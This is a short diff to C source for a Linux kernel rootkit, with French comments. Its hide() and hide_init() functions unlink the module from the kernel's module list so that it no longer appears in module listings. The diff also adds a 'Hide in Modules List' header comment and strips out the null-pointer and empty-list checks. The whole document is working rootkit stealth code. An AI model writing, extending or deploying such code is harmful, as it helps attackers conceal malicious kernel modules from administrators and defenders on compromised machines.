@@ -1,3 +1,6 @@
+/* Hide in Modules List */
+/*  https://elixir.bootlin.com/linux/v3.8/source/include/linux/module.h#L223 */
+
 #include <linux/kernel.h>
 #include <linux/mutex.h>
 #include "rootkit.h"
@@ -25,14 +28,12 @@ static struct list_head *get_modules_head(struct module *mod)
 /* Masquer ou afficher le module */
 void hide(struct module *mod, int hide)
 {
-    if (!mod) return; // Vérification de validité du module
-
     mutex_lock(&module_mutex);
 
-    if (hide && !list_empty(&mod->list)) {
-        list_del(&mod->list);  // Supprime le module de la liste
-    } else if (!hide) {
-        list_add(&mod->list, p_modules);  // Réinsère le module
+    if (hide) {
+        list_del(&mod->list);  // Masquer le module
+    } else {
+        list_add(&mod->list, p_modules);  // Réinsérer le module
     }
 
     mutex_unlock(&module_mutex);
@@ -41,8 +42,6 @@ void hide(struct module *mod, int hide)
 /* Initialiser le masquage en récupérant la tête de la liste des modules */
 int hide_init(struct module *mod)
 {
-    if (!mod) return -EINVAL;  // Vérifie que le module est valide
-
     p_modules = get_modules_head(mod);
     return p_modules ? 0 : -EINVAL;
 }
